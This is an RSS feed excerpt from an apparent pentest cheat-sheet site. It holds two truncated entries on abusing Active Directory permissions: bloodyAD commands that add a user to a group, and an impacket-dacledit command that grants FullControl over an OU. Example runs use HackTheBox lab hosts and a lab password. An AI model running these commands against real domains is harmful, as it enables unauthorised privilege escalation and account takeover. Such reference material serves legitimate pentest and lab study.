channel.title: Genericall on TLDRBins
channel.description: Recent content in Genericall on TLDRBins

item.title: AddSelf
item.description: Privesc #1: Add Self to Group (From Linux) bloodyAD powerview.py 1. Add Self to Group # Password bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>' $ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember SERVICEMGMT 'oorend' [+] oorend added to SERVICEMGMT # NTLM bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> add groupMember '<GROUP>' '<USER>' # Kerberos bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add groupMember '<GROUP>' '<USER>' $ bloodyAD -d absolute.

item.title: GenericAll
item.description: Abuse #1: Change Target User Password Linux Windows 1. Add Full Control to Current User [Optional] impacket bloodyAD # Kerberos sudo ntpdate -s <DC_IP> && impacket-dacledit '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl -use-ldaps $ sudo ntpdate -s 10.129.232.31 && impacket-dacledit 'REBOUND.HTB/oorend:1GR8t@$$4u' -k -dc-ip DC01.REBOUND.HTB -principal oorend -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance -action write -rights FullControl -use-ldaps Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [-] CCache file is not found.
